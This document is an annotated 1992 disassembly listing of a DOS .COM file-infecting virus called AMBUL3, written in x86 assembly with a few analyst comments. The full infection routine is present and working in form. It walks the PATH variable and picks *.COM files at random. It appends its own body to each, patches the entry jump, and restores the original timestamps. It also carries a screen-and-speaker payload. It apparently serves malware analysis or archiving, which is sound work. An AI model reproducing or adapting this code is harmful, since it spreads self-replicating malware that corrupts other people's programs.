;NAME:          AMBUL3.C-M
;FILE SIZE:     00330h - 816d
;START (CS:IP): 00100h
;CODE END:      00430h
;CODE ORIGIN:   00100h
;DATE:          Sun Aug 16 15:45:06 1992

CODE    SEGMENT BYTE PUBLIC 'CODE'
ASSUME  CS:CODE,DS:CODE,ES:NOTHING,SS:NOTHING

P00100  PROC
        ORG     0100h

H00100: JMP	H00114				    ;00100 E91100	 ___
;Will be overwritten with B4 09 BA-- MOV AH,09 and MOV DX
;---------------------------------------------------
	OR	[BX+DI],AX			    ;00103 0901 	 __
;DX gets this, location of string.
        INT     21h             ;Indef_INT:21h-AH   ;00105 CD21          _!
	INT	20h		;B-TERM_norm:20h    ;00107 CD20 	 _ 
;---------------------------------------------------
	DB	"Infect me!$"			    ;00109 496E6665637420
;---------------------------------------------------
H00114: CALL    H00118          ; . . . . . . . . . ;00114 E80100        ___
	ADD	[BP-7Fh],BX			    ;00117 015E81	 _^_
	OUT	DX,AL		;Port_OUT:DX	    ;0011A EE		 _
	ADD	AX,[BX+DI]			    ;0011B 0301 	 __
	CALL	H0013A		; . . . . . . . . . ;0011D E81A00	 ___
	CALL	H0013A		; . . . . . . . . . ;00120 E81700	 ___
	CALL	H002F8		; . . . . . . . . . ;00123 E8D201	 ___
	LEA	BX,[SI+0419h]			    ;00126 8D9C1904	 ____
	MOV	DI,0100h			    ;0012A BF0001	 ___
	MOV	AL,[BX] 			    ;0012D 8A07 	 __
	MOV	[DI],AL 			    ;0012F 8805 	 __
	MOV	AX,[BX+01h]			    ;00131 8B4701	 _G_
	MOV	[DI+01h],AX			    ;00134 894501	 _E_
	JMP	DI				    ;00137 FFE7 	 __
;---------------------------------------------------
	RET			;RET_Near	    ;00139 C3		 _
;---------------------------------------------------
H0013A: CALL	H0021B		; . . . . . . . . . ;0013A E8DE00	 ___
	MOV	AL,[SI+0428h]			    ;0013D 8A842804	 __(_
	OR	AL,AL				    ;00141 0AC0 	 __
	JZ	H00139				    ;00143 74F4 	 t_
	LEA	BX,[SI+040Fh]			    ;00145 8D9C0F04	 ____
	INC	Word Ptr [BX]			    ;00149 FF07 	 __
	LEA	DX,[SI+0428h]			    ;0014B 8D942804	 __(_
	MOV	AX,3D02h			    ;0014F B8023D	 __=
	INT	21h		;2-Open_Fl_Hdl	    ;00152 CD21 	 _!
	MOV	[SI+0417h],AX			    ;00154 89841704	 ____
	MOV	BX,[SI+0417h]			    ;00158 8B9C1704	 ____
	MOV	CX,0003h			    ;0015C B90300	 ___
	LEA	DX,[SI+0414h]			    ;0015F 8D941404	 ____
	MOV	AH,3Fh				    ;00163 B43F 	 _?
	INT	21h		;2-Rd_Fl_Hdl	    ;00165 CD21 	 _!
	MOV	AL,[SI+0414h]			    ;00167 8A841404	 ____
	CMP	AL,0E9h 			    ;0016B 3CE9 	 <_
	JNZ	H001AE				    ;0016D 753F 	 u?
	MOV	DX,[SI+0415h]			    ;0016F 8B941504	 ____
	MOV	BX,[SI+0417h]			    ;00173 8B9C1704	 ____
	ADD	DX,+03h 			    ;00177 83C203	 ___
	XOR	CX,CX				    ;0017A 33C9 	 3_
	MOV	AX,4200h			    ;0017C B80042	 __B
	INT	21h		;2-Mov_Fl_Hdl_Ptr   ;0017F CD21 	 _!
	MOV	BX,[SI+0417h]			    ;00181 8B9C1704	 ____
	MOV	CX,0006h			    ;00185 B90600	 ___
	LEA	DX,[SI+041Ch]			    ;00188 8D941C04	 ____
	MOV	AH,3Fh				    ;0018C B43F 	 _?
	INT	21h		;2-Rd_Fl_Hdl	    ;0018E CD21 	 _!
	MOV	AX,[SI+041Ch]			    ;00190 8B841C04	 ____
	MOV	BX,[SI+041Eh]			    ;00194 8B9C1E04	 ____
	MOV	CX,[SI+0420h]			    ;00198 8B8C2004	 __ _
	CMP	AX,[SI+0100h]			    ;0019C 3B840001	 ;___
	JNZ	H001AE				    ;001A0 750C 	 u_
	CMP	BX,[SI+0102h]			    ;001A2 3B9C0201	 ;___
	JNZ	H001AE				    ;001A6 7506 	 u_
	CMP	CX,[SI+0104h]			    ;001A8 3B8C0401	 ;___
	JZ	H00212				    ;001AC 7464 	 td
H001AE: MOV	BX,[SI+0417h]			    ;001AE 8B9C1704	 ____
	XOR	CX,CX				    ;001B2 33C9 	 3_
	XOR	DX,DX				    ;001B4 33D2 	 3_
	MOV	AX,4202h			    ;001B6 B80242	 __B
	INT	21h		;2-Mov_Fl_Hdl_Ptr   ;001B9 CD21 	 _!
	SUB	AX,0003h			    ;001BB 2D0300	 -__
	MOV	[SI+0412h],AX			    ;001BE 89841204	 ____
	MOV	BX,[SI+0417h]			    ;001C2 8B9C1704	 ____
	MOV	AX,5700h			    ;001C6 B80057	 __W
	INT	21h		;2-Fl_Hdl_Date_Time ;001C9 CD21 	 _!
	PUSH	CX				    ;001CB 51		 Q
	PUSH	DX				    ;001CC 52		 R
	MOV	BX,[SI+0417h]			    ;001CD 8B9C1704	 ____
	MOV	CX,0319h			    ;001D1 B91903	 ___
	LEA	DX,[SI+0100h]			    ;001D4 8D940001	 ____
	MOV	AH,40h				    ;001D8 B440 	 _@
	INT	21h		;2-Wr_Fl_Hdl	    ;001DA CD21 	 _!
	MOV	BX,[SI+0417h]			    ;001DC 8B9C1704	 ____
	MOV	CX,0003h			    ;001E0 B90300	 ___
	LEA	DX,[SI+0414h]			    ;001E3 8D941404	 ____
	MOV	AH,40h				    ;001E7 B440 	 _@
	INT	21h		;2-Wr_Fl_Hdl	    ;001E9 CD21 	 _!
	MOV	BX,[SI+0417h]			    ;001EB 8B9C1704	 ____
	XOR	CX,CX				    ;001EF 33C9 	 3_
	XOR	DX,DX				    ;001F1 33D2 	 3_
	MOV	AX,4200h			    ;001F3 B80042	 __B
	INT	21h		;2-Mov_Fl_Hdl_Ptr   ;001F6 CD21 	 _!
	MOV	BX,[SI+0417h]			    ;001F8 8B9C1704	 ____
	MOV	CX,0003h			    ;001FC B90300	 ___
	LEA	DX,[SI+0411h]			    ;001FF 8D941104	 ____
	MOV	AH,40h				    ;00203 B440 	 _@
	INT	21h		;2-Wr_Fl_Hdl	    ;00205 CD21 	 _!
	POP	DX				    ;00207 5A		 Z
	POP	CX				    ;00208 59		 Y
	MOV	BX,[SI+0417h]			    ;00209 8B9C1704	 ____
	MOV	AX,5701h			    ;0020D B80157	 __W
	INT	21h		;2-Fl_Hdl_Date_Time ;00210 CD21 	 _!
H00212: MOV	BX,[SI+0417h]			    ;00212 8B9C1704	 ____
	MOV	AH,3Eh				    ;00216 B43E 	 _>
	INT	21h		;2-Close_Fl_Hdl     ;00218 CD21 	 _!
	RET			;RET_Near	    ;0021A C3		 _
;---------------------------------------------------
H0021B: MOV	AX,DS:[002Ch]			    ;0021B A12C00	 _,_
	MOV	ES,AX		;ES_Chg 	    ;0021E 8EC0 	 __
	PUSH	DS				    ;00220 1E		 _
	MOV	AX,0040h			    ;00221 B84000	 _@_
	MOV	DS,AX		;DS_Chg 	    ;00224 8ED8 	 __
	MOV	BP,DS:[006Ch]			    ;00226 8B2E6C00	 _.l_
	POP	DS				    ;0022A 1F		 _
	TEST	BP,0003h			    ;0022B F7C50300	 ____
	JZ	H00248				    ;0022F 7417 	 t_
	XOR	BX,BX				    ;00231 33DB 	 3_
	MOV	AX,ES:[BX]	;ES_Ovrd	    ;00233 268B07	 &__
	CMP	AX,4150h			    ;00236 3D5041	 =PA
	JNZ	H00243				    ;00239 7508 	 u_
	CMP	Word Ptr ES:[BX+02h],4854h
				;ES_Ovrd	    ;0023B 26817F025448  &___TH
	JZ	H0024E				    ;00241 740B 	 t_
H00243: INC	BX				    ;00243 43		 C
	OR	AX,AX				    ;00244 0BC0 	 __
	JNZ	H00233				    ;00246 75EB 	 u_
H00248: LEA	DI,[SI+0428h]			    ;00248 8DBC2804	 __(_
	JMP	Short H00280			    ;0024C EB32 	 _2
;---------------------------------------------------
H0024E: ADD	BX,+05h 			    ;0024E 83C305	 ___
	LEA	DI,[SI+0428h]			    ;00251 8DBC2804	 __(_
	MOV	AL,ES:[BX]	;ES_Ovrd	    ;00255 268A07	 &__
	INC	BX				    ;00258 43		 C
	OR	AL,AL				    ;00259 0AC0 	 __
	JZ	H00276				    ;0025B 7419 	 t_
	CMP	AL,3Bh				    ;0025D 3C3B 	 <;
	JZ	H00266				    ;0025F 7405 	 t_
	MOV	[DI],AL 			    ;00261 8805 	 __
	INC	DI				    ;00263 47		 G
	JMP	Short H00255			    ;00264 EBEF 	 __
;---------------------------------------------------
H00266: CMP	Byte Ptr ES:[BX],00h
				;ES_Ovrd	    ;00266 26803F00	 &_?_
	JZ	H00276				    ;0026A 740A 	 t_
	SHR	BP,1				    ;0026C D1ED 	 __
	SHR	BP,1				    ;0026E D1ED 	 __
	TEST	BP,0003h			    ;00270 F7C50300	 ____
	JNZ	H00251				    ;00274 75DB 	 u_
H00276: CMP	Byte Ptr [DI-01h],5Ch		    ;00276 807DFF5C	 _}_\
	JZ	H00280				    ;0027A 7404 	 t_
	MOV	Byte Ptr [DI],5Ch		    ;0027C C6055C	 __\
	INC	DI				    ;0027F 47		 G
H00280: PUSH	DS				    ;00280 1E		 _
	POP	ES				    ;00281 07		 _
	MOV	[SI+0422h],DI			    ;00282 89BC2204	 __"_
;********* Put "*.COM" at ES:DI
        MOV     AX,2E2Ah                            ;00286 B82A2E        _*.
	STOSW					    ;00289 AB		 _
	MOV	AX,4F43h			    ;0028A B8434F	 _CO
	STOSW					    ;0028D AB		 _
	MOV	AX,004Dh			    ;0028E B84D00	 _M_
	STOSW					    ;00291 AB		 _
;**********
        PUSH    ES                                  ;00292 06            _
	MOV	AH,2Fh				    ;00293 B42F 	 _/
	INT	21h		;2-Get_DTA	    ;00295 CD21 	 _!
	MOV	AX,ES				    ;00297 8CC0 	 __
	MOV	[SI+0424h],AX			    ;00299 89842404	 __$_
	MOV	[SI+0426h],BX			    ;0029D 899C2604	 __&_
	POP	ES				    ;002A1 07		 _
	LEA	DX,[SI+0478h]			    ;002A2 8D947804	 __x_
	MOV	AH,1Ah				    ;002A6 B41A 	 __
	INT	21h		;1-Set_DTA	    ;002A8 CD21 	 _!
	LEA	DX,[SI+0428h]			    ;002AA 8D942804	 __(_
	XOR	CX,CX				    ;002AE 33C9 	 3_
	MOV	AH,4Eh				    ;002B0 B44E 	 _N
	INT	21h		;2-Srch_1st_Fl_Hdl  ;002B2 CD21 	 _!
	JNB	H002BE				    ;002B4 7308 	 s_
	XOR	AX,AX				    ;002B6 33C0 	 3_
	MOV	[SI+0428h],AX			    ;002B8 89842804	 __(_
	JMP	Short H002E7			    ;002BC EB29 	 _)
;---------------------------------------------------
H002BE: PUSH	DS				    ;002BE 1E		 _
	MOV	AX,0040h			    ;002BF B84000	 _@_
	MOV	DS,AX		;DS_Chg 	    ;002C2 8ED8 	 __
	ROR	BP,1				    ;002C4 D1CD 	 __
	XOR	BP,DS:[006Ch]			    ;002C6 332E6C00	 3.l_
	POP	DS				    ;002CA 1F		 _
	TEST	BP,0007h			    ;002CB F7C50700	 ____
	JZ	H002D7				    ;002CF 7406 	 t_
	MOV	AH,4Fh				    ;002D1 B44F 	 _O
	INT	21h		;2-Srch_Nxt_Fl_Hdl  ;002D3 CD21 	 _!
	JNB	H002BE				    ;002D5 73E7 	 s_
H002D7: MOV	DI,[SI+0422h]			    ;002D7 8BBC2204	 __"_
	LEA	BX,[SI+0496h]			    ;002DB 8D9C9604	 ____
	MOV	AL,[BX] 			    ;002DF 8A07 	 __
	INC	BX				    ;002E1 43		 C
	STOSB					    ;002E2 AA		 _
	OR	AL,AL				    ;002E3 0AC0 	 __
	JNZ	H002DF				    ;002E5 75F8 	 u_
H002E7: MOV	BX,[SI+0426h]			    ;002E7 8B9C2604	 __&_
	MOV	AX,[SI+0424h]			    ;002EB 8B842404	 __$_
	PUSH	DS				    ;002EF 1E		 _
	MOV	DS,AX		;DS_Chg 	    ;002F0 8ED8 	 __
	MOV	AH,1Ah				    ;002F2 B41A 	 __
	INT	21h		;1-Set_DTA	    ;002F4 CD21 	 _!
	POP	DS				    ;002F6 1F		 _
	RET			;RET_Near	    ;002F7 C3		 _
;---------------------------------------------------
H002F8: PUSH	ES				    ;002F8 06		 _
	MOV	AX,[SI+040Fh]			    ;002F9 8B840F04	 ____
	AND	AX,0007h			    ;002FD 250700	 %__
	CMP	AX,0006h			    ;00300 3D0600	 =__
	JNZ	H0031A				    ;00303 7515 	 u_
	MOV	AX,0040h			    ;00305 B84000	 _@_
	MOV	ES,AX		;ES_Chg 	    ;00308 8EC0 	 __
	MOV	AX,ES:[000Ch]	;ES_Ovrd	    ;0030A 26A10C00	 &___
	OR	AX,AX				    ;0030E 0BC0 	 __
	JNZ	H0031A				    ;00310 7508 	 u_
	INC	Word Ptr ES:[000Ch]
				;ES_Ovrd	    ;00312 26FF060C00	 &____
	CALL	H0031C		; . . . . . . . . . ;00317 E80200	 ___
H0031A: POP	ES				    ;0031A 07		 _
	RET			;RET_Near	    ;0031B C3		 _
;---------------------------------------------------
H0031C: PUSH	DS				    ;0031C 1E		 _
	MOV	DI,0B800h			    ;0031D BF00B8	 ___
	MOV	AX,0040h			    ;00320 B84000	 _@_
	MOV	DS,AX		;DS_Chg 	    ;00323 8ED8 	 __
	MOV	AL,DS:[0049h]			    ;00325 A04900	 _I_
	CMP	AL,07h				    ;00328 3C07 	 <_
	JNZ	H0032F				    ;0032A 7503 	 u_
	MOV	DI,0B000h			    ;0032C BF00B0	 ___
H0032F: MOV	ES,DI		;ES_Chg 	    ;0032F 8EC7 	 __
	POP	DS				    ;00331 1F		 _
	MOV	BP,0FFF0h			    ;00332 BDF0FF	 ___
	MOV	DX,0000h			    ;00335 BA0000	 ___
	MOV	CX,0010h			    ;00338 B91000	 ___
	CALL	H0037D		; . . . . . . . . . ;0033B E83F00	 _?_
	INC	DX				    ;0033E 42		 B
	LOOP	H0033B				    ;0033F E2FA 	 __
	CALL	H0035A		; . . . . . . . . . ;00341 E81600	 ___
	CALL	H003C2		; . . . . . . . . . ;00344 E87B00	 _{_
	INC	BP				    ;00347 45		 E
	CMP	BP,+50h 			    ;00348 83FD50	 __P
	JNZ	H00335				    ;0034B 75E8 	 u_
        CALL    SILENC          ; . . . . . . . . . ;0034D E80300        ___
	PUSH	DS				    ;00350 1E		 _
	POP	ES				    ;00351 07		 _
	RET			;RET_Near	    ;00352 C3		 _
;---------------------------------------------------
;********** Silence speaker
SILENC: IN      AL,61h          ;Port_IN:61h        ;00353 E461          _a
	AND	AL,0FCh 			    ;00355 24FC 	 $_
	OUT	61h,AL		;Port_OUT:61h	    ;00357 E661 	 _a
	RET			;RET_Near	    ;00359 C3		 _
;---------------------------------------------------
H0035A: MOV	DX,07D0h			    ;0035A BAD007	 ___
	TEST	BP,0004h			    ;0035D F7C50400	 ____
	JZ	H00366				    ;00361 7403 	 t_
	MOV	DX,0BB8h			    ;00363 BAB80B	 ___
H00366: IN	AL,61h		;Port_IN:61h	    ;00366 E461 	 _a
	TEST	AL,03h				    ;00368 A803 	 __
	JNZ	H00374				    ;0036A 7508 	 u_
	OR	AL,03h				    ;0036C 0C03 	 __
	OUT	61h,AL		;Port_OUT:61h	    ;0036E E661 	 _a
	MOV	AL,0B6h 			    ;00370 B0B6 	 __
	OUT	43h,AL		;Port_OUT:43h	    ;00372 E643 	 _C
H00374: MOV	AX,DX				    ;00374 8BC2 	 __
	OUT	42h,AL		;Port_OUT:42h	    ;00376 E642 	 _B
	MOV	AL,AH				    ;00378 88E0 	 __
	OUT	42h,AL		;Port_OUT:42h	    ;0037A E642 	 _B
	RET			;RET_Near	    ;0037C C3		 _
;---------------------------------------------------
H0037D: PUSH	CX				    ;0037D 51		 Q
	PUSH	DX				    ;0037E 52		 R
	LEA	BX,[SI+03BFh]			    ;0037F 8D9CBF03	 ____
	ADD	BX,DX				    ;00383 03DA 	 __
	ADD	DX,BP				    ;00385 01EA 	 __
	OR	DX,DX				    ;00387 0BD2 	 __
	JS	H003BF				    ;00389 7834 	 x4
	CMP	DX,+50h 			    ;0038B 83FA50	 __P
	JNB	H003BF				    ;0038E 732F 	 s/
	MOV	DI,0C80h			    ;00390 BF800C	 ___
	ADD	DI,DX				    ;00393 03FA 	 __
	ADD	DI,DX				    ;00395 03FA 	 __
	SUB	DX,BP				    ;00397 29EA 	 )_
	MOV	CX,0005h			    ;00399 B90500	 ___
	MOV	AH,07h				    ;0039C B407 	 __
	MOV	AL,[BX] 			    ;0039E 8A07 	 __
	SUB	AL,07h				    ;003A0 2C07 	 ,_
	ADD	AL,CL				    ;003A2 02C1 	 __
	SUB	AL,DL				    ;003A4 28D0 	 (_
	CMP	CX,+05h 			    ;003A6 83F905	 ___
	JNZ	H003B5				    ;003A9 750A 	 u_
	MOV	AH,0Fh				    ;003AB B40F 	 __
	TEST	BP,0003h			    ;003AD F7C50300	 ____
	JZ	H003B5				    ;003B1 7402 	 t_
	MOV	AL,20h				    ;003B3 B020 	 _ 
H003B5: STOSW					    ;003B5 AB		 _
	ADD	BX,+10h 			    ;003B6 83C310	 ___
	ADD	DI,009Eh			    ;003B9 81C79E00	 ____
	LOOP	H0039C				    ;003BD E2DD 	 __
H003BF: POP	DX				    ;003BF 5A		 Z
	POP	CX				    ;003C0 59		 Y
	RET			;RET_Near	    ;003C1 C3		 _
;---------------------------------------------------
H003C2: PUSH	DS				    ;003C2 1E		 _
	MOV	AX,0040h			    ;003C3 B84000	 _@_
	MOV	DS,AX		;DS_Chg 	    ;003C6 8ED8 	 __
	MOV	AX,DS:[006Ch]			    ;003C8 A16C00	 _l_
	CMP	AX,DS:[006Ch]			    ;003CB 3B066C00	 ;_l_
	JZ	H003CB				    ;003CF 74FA 	 t_
	POP	DS				    ;003D1 1F		 _
	RET			;RET_Near	    ;003D2 C3		 _
;---------------------------------------------------
	DB	'"'                                 ;003D3 22
;---------------------------------------------------
	AND	SP,[SI] 	;SP_Chg 	    ;003D4 2324 	 #$
	AND	AX,2726h			    ;003D6 252627	 %&'
	SUB	[BX+DI],CH			    ;003D9 2829 	 ()
	DB	66h		;Indef_OP:66h	    ;003DB 66		 f
;---------------------------------------------------
	XCHG	DI,[BP+DI]			    ;003DC 873B 	 _;
	SUB	AX,2F2Eh			    ;003DE 2D2E2F	 -./
	XOR	[BX+DI],DH			    ;003E1 3031 	 01
	AND	SP,AX		;SP_Chg 	    ;003E3 23E0 	 #_
	LOOPZ	H003C9				    ;003E5 E1E2 	 __
	JCXZ	H003CD				    ;003E7 E3E4 	 __
	IN	AX,0E6h 	;Port_IN:E6h	    ;003E9 E5E6 	 __
	OUT	0E7h,AX 	;Port_OUT:E7h	    ;003EB E7E7 	 __
	JMP	H0EFDA				    ;003ED E9EAEB	 ___
;---------------------------------------------------
	XOR	[BX+DI],DH			    ;003F0 3031 	 01
	XOR	AH,[SI] 			    ;003F2 3224 	 2$
	LOOPNZ	H003D7				    ;003F4 E0E1 	 __
	LOOP	H003DB				    ;003F6 E2E3 	 __
	CALL	H0EE25		; . . . . . . . . . ;003F8 E82AEA	 _*_
	OUT	0E8h,AX 	;Port_OUT:E8h	    ;003FB E7E8 	 __
	JMP	H0342F				    ;003FD E92F30	 _/0
;---------------------------------------------------
	DB	6Dh		;286_INSW	    ;00400 6D		 m
;---------------------------------------------------
	XOR	DH,[BP+DI]			    ;00401 3233 	 23
	AND	AX,0E2E1h			    ;00403 25E1E2	 %__
	JCXZ	H003EC				    ;00406 E3E4 	 __
	IN	AX,0E7h 	;Port_IN:E7h	    ;00408 E5E7 	 __
	OUT	0E8h,AX 	;Port_OUT:E8h	    ;0040A E7E8 	 __
	JMP	H0EFF9				    ;0040C E9EAEB	 ___
;---------------------------------------------------
	IN	AL,DX		;Port_IN:DX	    ;0040F EC		 _
	IN	AX,DX		;Port_IN:DX	    ;00410 ED		 _
	OUT	DX,AL		;Port_OUT:DX	    ;00411 EE		 _
	OUT	DX,AX		;Port_OUT:DX	    ;00412 EF		 _
	OUT	0E7h,AL 	;ES_Ovrd	    ;00413 26E6E7	 &__
	SUB	[BX+DI+5Ah],BX			    ;00416 29595A	 )YZ
	SUB	AL,0ECh 			    ;00419 2CEC 	 ,_
	IN	AX,DX		;Port_IN:DX	    ;0041B ED		 _
	OUT	DX,AL		;Port_OUT:DX	    ;0041C EE		 _
	OUT	DX,AX		;Port_OUT:DX	    ;0041D EF		 _
	DB	0F0h		;LOCK:F0h	    ;0041E F0		 _
        XOR     AH,[BP+SI+34]                       ;0041F 326234        2b4
;---------------------------------------------------
	HLT			;SYSTEM_HALT	    ;00422 F4		 _
	OR	AL,[BX+SI]			    ;00423 0A00 	 __
	JMP	H00439				    ;00425 E91100	 ___
;---------------------------------------------------
        DB      0B4h, 09h, 0BAh ;First three bytes  ;00428
        DB      05,00           ;Dunno              ;0042B
        DB      0B4h, 09h, 0BAh ;First three bytes  ;0042D
                                ;AGAIN! Wierd
P00100  ENDP

CODE    ENDS
        END     H00100
 
;-------------------------------------------------------------------------------
